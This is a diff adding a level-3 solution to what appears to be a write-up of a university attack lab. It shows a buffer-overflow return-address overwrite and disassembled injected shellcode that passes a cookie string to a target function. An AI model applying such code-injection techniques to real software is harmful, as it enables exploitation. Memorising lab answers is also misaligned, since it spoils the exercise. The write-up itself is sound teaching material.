@@ -44,3 +44,31 @@ injection:
     nop...
 0x5561dc78^^^
 ```
+
+## Lv 3
+
+Similar to Lv2:
+- the value of `cookie`: `0x59b997fa`
+- the corresponding little-endian value for the string `'59b997fa'`: `0x6166373939623935`
+- the address of original ret address: `0x5561dca0`
+- address of `touch3`: `0x4018fa`
+
+Firstly overwrite the original ret address with `<injection>`'s address: [`0x5561dca0`, +4] = `0x5561dc78`, which is the bottom of the memory space for `buf`.
+
+Now we define the place start from the bottom of the memory space for `buf` (`0x5561dc78`) as the new start of stack.
+
+Then the injection code:
+
+```asm
+0000000000000000 <injection>:
+   0:	90                   	nop
+   1:	48 c7 c4 78 dc 61 55 	mov    $0x5561dc78,%rsp
+   8:	48 bf 35 39 62 39 39 	movabs $0x6166373939623935,%rdi
+   f:	37 66 61 
+  12:	6a 00                	push   $0x0
+  14:	57                   	push   %rdi
+  15:	48 89 e7             	mov    %rsp,%rdi
+  18:	48 c7 c0 fa 18 40 00 	mov    $0x4018fa,%rax
+  1f:	50                   	push   %rax
+  20:	c3                   	ret
+```
